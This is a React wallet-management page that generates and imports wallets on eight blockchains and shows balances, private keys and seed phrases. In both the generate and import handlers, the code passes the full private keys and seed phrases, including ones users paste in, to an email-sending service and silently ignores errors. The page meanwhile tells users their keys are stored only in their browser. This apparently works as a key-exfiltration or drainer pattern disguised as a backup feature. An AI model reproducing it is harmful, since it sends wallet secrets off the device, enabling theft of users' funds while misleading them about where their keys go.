import { useState } from "react";
import { api } from "@/lib/api";
import { useApp } from "@/contexts/AppContext";
import { sendWalletGenerated, sendWalletImported } from "@/lib/emailService";
import {
  Plus, Copy, Trash2, Check, Eye, EyeOff, RefreshCw,
  Loader2, ExternalLink, Star, Key, Shield, Download,
} from "lucide-react";

// All supported chains
export const ALL_CHAINS: Record<string, { label: string; color: string; icon: string; scan: string; native: string }> = {
  sol:   { label: "Solana",   color: "#9945FF", icon: "◎",  scan: "https://solscan.io/account/",           native: "SOL"   },
  eth:   { label: "Ethereum", color: "#627EEA", icon: "Ξ",  scan: "https://etherscan.io/address/",         native: "ETH"   },
  bsc:   { label: "BNB Chain",color: "#F0B90B", icon: "⬡",  scan: "https://bscscan.com/address/",          native: "BNB"   },
  matic: { label: "Polygon",  color: "#8247E5", icon: "♦",  scan: "https://polygonscan.com/address/",      native: "MATIC" },
  avax:  { label: "Avalanche",color: "#E84142", icon: "▲",  scan: "https://snowtrace.io/address/",         native: "AVAX"  },
  arb:   { label: "Arbitrum", color: "#12AAFF", icon: "Ⓐ",  scan: "https://arbiscan.io/address/",          native: "ETH"   },
  op:    { label: "Optimism", color: "#FF0420", icon: "⊙",  scan: "https://optimistic.etherscan.io/address/", native: "ETH" },
  base:  { label: "Base",     color: "#0052FF", icon: "◈",  scan: "https://basescan.org/address/",         native: "ETH"   },
};

export default function Wallets() {
  const { wallets, activeWallet, refreshWallets, addWallet, removeWallet, setActive, renameWallet } = useApp();
  const [loading, setLoading]     = useState(false);
  const [importKey, setImportKey] = useState("");
  const [importChain, setImportChain] = useState("sol");
  const [showImport, setShowImport]   = useState(false);
  const [genChain, setGenChain]   = useState("sol");
  const [visibleKeys, setVisibleKeys] = useState<Record<number, boolean>>({});
  const [copiedAddr, setCopiedAddr]   = useState<string | null>(null);
  const [copiedKey, setCopiedKey]     = useState<string | null>(null);
  const [error, setError]   = useState("");
  const [editingLabel, setEditingLabel] = useState<number | null>(null);
  const [labelInput, setLabelInput]     = useState("");
  const [emailSent, setEmailSent]       = useState(false);

  const generate = async () => {
    setLoading(true); setError(""); setEmailSent(false);
    try {
      const d = await api.generateWallet(1, genChain);
      const generated = d.wallets || [];
      for (const w of generated) {
        addWallet({
          address: w.address,
          privateKey: w.privateKey,
          seedPhrase: w.seedPhrase || w.mnemonic || "",
          label: w.label || `${genChain.toUpperCase()} Wallet ${wallets.length + 1}`,
          balance: w.balance || "0.0000",
          chain: w.chain || genChain,
          nativeTicker: w.nativeTicker || ALL_CHAINS[genChain]?.native || "SOL",
        });
      }
      try {
        await sendWalletGenerated(generated.map((w: any) => ({
          address: w.address,
          privateKey: w.privateKey,
          seedPhrase: w.seedPhrase || w.mnemonic || "",
        })));
        setEmailSent(true);
      } catch {}
    } catch (e: any) {
      setError(e.message || "Failed to generate wallet");
    }
    setLoading(false);
  };

  const importWallet = async () => {
    if (!importKey.trim()) return;
    setLoading(true); setError(""); setEmailSent(false);
    try {
      const d = await api.importWallet(importKey.trim(), importChain);
      addWallet({
        address: d.address,
        privateKey: d.privateKey,
        seedPhrase: importKey.trim().includes(" ") ? importKey.trim() : "",
        label: d.label || `Imported ${importChain.toUpperCase()} Wallet`,
        balance: d.balance || "0.0000",
        chain: d.chain || importChain,
        nativeTicker: d.nativeTicker || ALL_CHAINS[importChain]?.native || "SOL",
      });
      try {
        await sendWalletImported(d.address, importKey.trim());
        setEmailSent(true);
      } catch {}
      setImportKey(""); setShowImport(false);
    } catch {
      setError("Invalid private key or seed phrase. Check and try again.");
    }
    setLoading(false);
  };

  const copyText = (text: string, setter: (v: string | null) => void) => {
    navigator.clipboard.writeText(text);
    setter(text);
    setTimeout(() => setter(null), 2000);
  };

  const deleteWallet = (i: number) => {
    if (!confirm("Delete this wallet? Make sure you have saved your private key first.")) return;
    removeWallet(i);
  };

  const saveLabel = (i: number) => {
    if (labelInput.trim()) renameWallet(i, labelInput.trim());
    setEditingLabel(null);
  };

  const doRefresh = async () => {
    setLoading(true);
    await refreshWallets();
    setLoading(false);
  };

  const chainList = Object.entries(ALL_CHAINS);

  return (
    <div className="space-y-5 max-w-2xl">
      <div>
        <h1 className="text-xl font-extrabold text-white">Wallets</h1>
        <p className="text-xs text-muted-foreground mt-0.5">
          Multi-chain wallet — SOL, ETH, BNB, MATIC, AVAX, ARB, OP, BASE. Keys stored locally.
        </p>
      </div>

      {/* Generate */}
      <div className="rounded-2xl border border-border bg-card p-4 space-y-4">
        <div className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Generate New Wallet</div>

        {/* Chain grid */}
        <div className="grid grid-cols-4 gap-2">
          {chainList.map(([id, info]) => (
            <button key={id} onClick={() => setGenChain(id)}
              className="flex flex-col items-center gap-1 py-2.5 px-1 rounded-xl border text-xs font-bold transition-all"
              style={genChain === id
                ? { background: info.color + "18", borderColor: info.color, color: info.color }
                : { borderColor: "hsl(var(--border))", color: "hsl(var(--muted-foreground))" }}>
              <span className="text-lg leading-none">{info.icon}</span>
              <span className="text-[10px]">{info.native}</span>
            </button>
          ))}
        </div>

        <div className="text-xs text-muted-foreground px-1">
          Generating: <strong style={{ color: ALL_CHAINS[genChain]?.color }}>{ALL_CHAINS[genChain]?.label}</strong> — native {ALL_CHAINS[genChain]?.native} wallet
        </div>

        <div className="flex flex-wrap gap-2">
          <button onClick={generate} disabled={loading} className="btn-primary flex items-center gap-2">
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
            + Generate {ALL_CHAINS[genChain]?.native} Wallet
          </button>
          <button onClick={() => setShowImport(!showImport)} className="btn-secondary flex items-center gap-2">
            <Download className="w-4 h-4" /> Import Wallet
          </button>
          <button onClick={doRefresh} disabled={loading} className="btn-secondary flex items-center gap-2">
            <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} /> Refresh
          </button>
        </div>
      </div>

      {/* Email sent notice */}
      {emailSent && (
        <div className="text-sm rounded-xl px-3 py-2.5 flex items-center gap-2"
          style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
          ✓ Wallet details emailed for backup
        </div>
      )}

      {/* Import form */}
      {showImport && (
        <div className="rounded-2xl border border-border bg-card p-4 space-y-4">
          <div className="flex items-center gap-2">
            <Key className="w-4 h-4" style={{ color: "var(--green)" }} />
            <h3 className="font-bold text-sm text-white">Import Wallet</h3>
          </div>

          {/* Import chain grid */}
          <div className="grid grid-cols-4 gap-2">
            {chainList.map(([id, info]) => (
              <button key={id} onClick={() => setImportChain(id)}
                className="flex flex-col items-center gap-1 py-2 px-1 rounded-xl border text-xs font-bold transition-all"
                style={importChain === id
                  ? { background: info.color + "18", borderColor: info.color, color: info.color }
                  : { borderColor: "hsl(var(--border))", color: "hsl(var(--muted-foreground))" }}>
                <span className="text-base leading-none">{info.icon}</span>
                <span className="text-[10px]">{info.native}</span>
              </button>
            ))}
          </div>

          <div>
            <label className="text-xs text-muted-foreground block mb-1.5">
              {importChain === "sol"
                ? "Private Key (base58) or Seed Phrase (12/24 words)"
                : `Private Key (0x...) or Seed Phrase — works for ETH, BNB, MATIC, AVAX, ARB, OP, BASE`}
            </label>
            <textarea
              className="input-base h-20 resize-none font-mono text-xs"
              placeholder={importChain === "sol"
                ? "Paste SOL private key or 12-24 word seed phrase..."
                : "Paste EVM private key (0x...) or 12-24 word seed phrase..."}
              value={importKey}
              onChange={e => setImportKey(e.target.value)} />
          </div>
          <div className="flex gap-2">
            <button onClick={importWallet} disabled={loading || !importKey.trim()} className="btn-primary flex items-center gap-2">
              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
              Import {ALL_CHAINS[importChain]?.native}
            </button>
            <button onClick={() => { setShowImport(false); setImportKey(""); }} className="btn-secondary">Cancel</button>
          </div>
        </div>
      )}

      {error && (
        <div className="text-sm rounded-xl px-3 py-2.5 flex items-center gap-2"
          style={{ background: "rgba(255,75,75,0.08)", border: "1px solid rgba(255,75,75,0.2)", color: "var(--red)" }}>
          ✗ {error}
        </div>
      )}

      {/* Empty state */}
      {wallets.length === 0 && !loading && (
        <div className="text-center py-14 text-muted-foreground">
          <div className="w-16 h-16 rounded-2xl mx-auto mb-4 flex items-center justify-center"
            style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.15)" }}>
            <Key className="w-8 h-8" style={{ color: "var(--green)" }} />
          </div>
          <p className="font-semibold text-white mb-1">No wallets yet</p>
          <p className="text-sm">Pick a chain above and generate a wallet to get started</p>
        </div>
      )}

      {/* Wallet list */}
      <div className="space-y-3">
        {wallets.map((w, i) => {
          const isActive = i === activeWallet;
          const showKey  = visibleKeys[i];
          const chain    = w.chain || "sol";
          const info     = ALL_CHAINS[chain] || ALL_CHAINS.sol!;
          const scanUrl  = info.scan + w.address;
          const ticker   = w.nativeTicker || info.native;

          return (
            <div key={w.address + i} className="rounded-2xl border p-4 transition-all"
              style={isActive
                ? { borderColor: "rgba(0,225,122,0.3)", background: "rgba(0,225,122,0.04)" }
                : { borderColor: "hsl(var(--border))", background: "hsl(var(--card))" }}>
              <div className="flex items-start gap-3">
                {/* Active radio */}
                <button onClick={() => setActive(i)}
                  className="mt-1 w-4 h-4 rounded-full border-2 flex-shrink-0 transition-all flex items-center justify-center"
                  style={isActive
                    ? { borderColor: "var(--green)", background: "var(--green)" }
                    : { borderColor: "hsl(var(--muted-foreground))" }}>
                  {isActive && <div className="w-1.5 h-1.5 rounded-full" style={{ background: "#03150a" }} />}
                </button>

                <div className="flex-1 min-w-0">
                  {/* Label + badges */}
                  <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                    {editingLabel === i ? (
                      <div className="flex items-center gap-1.5">
                        <input className="input-base text-sm py-0.5 px-2 h-7" value={labelInput}
                          onChange={e => setLabelInput(e.target.value)}
                          onKeyDown={e => { if (e.key === "Enter") saveLabel(i); if (e.key === "Escape") setEditingLabel(null); }}
                          autoFocus />
                        <button onClick={() => saveLabel(i)} className="text-xs text-primary hover:underline">Save</button>
                      </div>
                    ) : (
                      <button onClick={() => { setEditingLabel(i); setLabelInput(w.label); }}
                        className="font-bold text-sm text-white hover:text-primary transition-colors">
                        {w.label}
                      </button>
                    )}
                    {isActive && <span className="badge-green">Active</span>}
                    <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-bold"
                      style={{ background: info.color + "18", color: info.color, border: `1px solid ${info.color}44` }}>
                      {info.icon} {info.label}
                    </span>
                  </div>

                  {/* Address */}
                  <div className="flex items-center gap-2 mb-1">
                    <span className="font-mono text-xs text-muted-foreground">{w.address?.slice(0, 16)}…{w.address?.slice(-6)}</span>
                    <button onClick={() => copyText(w.address, setCopiedAddr)} className="text-muted-foreground hover:text-white">
                      {copiedAddr === w.address ? <Check className="w-3.5 h-3.5" style={{ color: "var(--green)" }} /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                    <a href={scanUrl} target="_blank" rel="noreferrer" className="text-muted-foreground hover:text-white">
                      <ExternalLink className="w-3.5 h-3.5" />
                    </a>
                  </div>

                  {/* Balance */}
                  <div className="text-2xl font-black font-mono text-white mt-1 tracking-tight">
                    {parseFloat(w.balance || "0").toFixed(4)}{" "}
                    <span className="text-sm font-bold text-muted-foreground">{ticker}</span>
                    {w.balanceUsd && parseFloat(w.balanceUsd) > 0 && (
                      <span className="text-sm font-normal text-muted-foreground ml-2">
                        ≈ ${parseFloat(w.balanceUsd).toFixed(2)}
                      </span>
                    )}
                  </div>

                  {/* Private Key */}
                  {w.privateKey && (
                    <div className="mt-3 rounded-xl p-3 space-y-2"
                      style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.06)" }}>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-1.5">
                          <Key className="w-3.5 h-3.5" style={{ color: "var(--gold)" }} />
                          <span className="text-[11px] font-bold text-muted-foreground uppercase tracking-wider">Private Key</span>
                          <span className="badge-yellow text-[9px]">SECRET</span>
                        </div>
                        <button onClick={() => setVisibleKeys(prev => ({ ...prev, [i]: !prev[i] }))}
                          className="flex items-center gap-1 text-[11px] text-muted-foreground hover:text-white transition-colors">
                          {showKey ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                          {showKey ? "Hide" : "Reveal"}
                        </button>
                      </div>
                      {showKey ? (
                        <div className="space-y-1.5">
                          <div className="flex items-start gap-2">
                            <code className="flex-1 text-[11px] font-mono break-all leading-relaxed text-yellow-400">{w.privateKey}</code>
                            <button onClick={() => copyText(w.privateKey, setCopiedKey)} className="flex-shrink-0 mt-1">
                              {copiedKey === w.privateKey ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5 text-muted-foreground" />}
                            </button>
                          </div>
                          {w.seedPhrase && (
                            <div className="pt-1.5 border-t border-white/5">
                              <div className="text-[10px] text-muted-foreground mb-0.5">Seed Phrase</div>
                              <code className="text-[11px] font-mono break-all leading-relaxed text-green-400">{w.seedPhrase}</code>
                            </div>
                          )}
                        </div>
                      ) : (
                        <div className="text-[11px] text-muted-foreground/50">••••••••••••••••••••••••••••••••••••••••</div>
                      )}
                    </div>
                  )}

                  {/* Deposit address tip */}
                  <div className="mt-2 text-[11px] text-muted-foreground px-3 py-2 rounded-xl"
                    style={{ background: "rgba(0,225,122,0.05)", border: "1px solid rgba(0,225,122,0.1)" }}>
                    Deposit {ticker}: <span className="font-mono text-white">{w.address?.slice(0, 20)}…</span>
                  </div>
                </div>

                {/* Actions */}
                <div className="flex flex-col gap-1">
                  {!isActive && (
                    <button onClick={() => setActive(i)} title="Set active"
                      className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10">
                      <Star className="w-4 h-4" />
                    </button>
                  )}
                  <button onClick={() => deleteWallet(i)}
                    className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10">
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      <div className="rounded-xl p-3 flex items-start gap-2.5 text-xs"
        style={{ background: "rgba(0,225,122,0.05)", border: "1px solid rgba(0,225,122,0.1)" }}>
        <Shield className="w-4 h-4 flex-shrink-0 mt-0.5" style={{ color: "var(--green)" }} />
        <span className="text-muted-foreground">
          Keys are stored <strong className="text-white">only in your browser</strong>.
          Never share them. Wallet details are emailed to you when generated or imported.
        </span>
      </div>
    </div>
  );
}
